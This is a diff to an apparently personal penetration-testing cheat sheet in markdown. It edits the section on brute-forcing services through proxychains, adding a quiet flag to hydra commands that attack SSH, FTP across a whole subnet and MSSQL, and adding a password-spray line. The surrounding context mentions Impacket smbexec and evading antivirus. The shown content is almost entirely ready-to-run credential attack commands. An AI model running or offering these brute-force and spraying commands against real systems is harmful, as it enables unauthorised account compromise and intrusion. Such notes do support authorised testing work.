@@ -78,9 +78,10 @@ Using Impacket SMBexec.py script - often caught by AV so be careful. Smbexec has
     
 ### Brute Force a Service Through Proxychains    
 
-    proxychains hydra 10.10.10.10 ssh -s 22 -L users.txt -P passwords.txt -t 4     
-    proxychains hydra -L usernames -P passwords 10.10.10.0/24 ftp       #brute force a subnet   
-    proxychains hydra -L users –P passwords <IP> mssql   #MSSQL    
+    proxychains -q hydra 10.10.10.10 ssh -s 22 -L users.txt -P passwords.txt -t 4     
+    proxychains -q hydra -L usernames -P passwords 10.10.10.0/24 ftp       #brute force a subnet   
+    proxychains -q hydra -L users –P passwords <IP> mssql   #MSSQL    
+    proxychains -q hydra -C creds.txt -M ips.txt ftp    #password spray a lis
     
 ## Uploading Static Binaries    
 Use static binaries from [here](https://github.com/ernw/static-toolbox) or [here](https://github.com/andrew-d/static-binaries)     
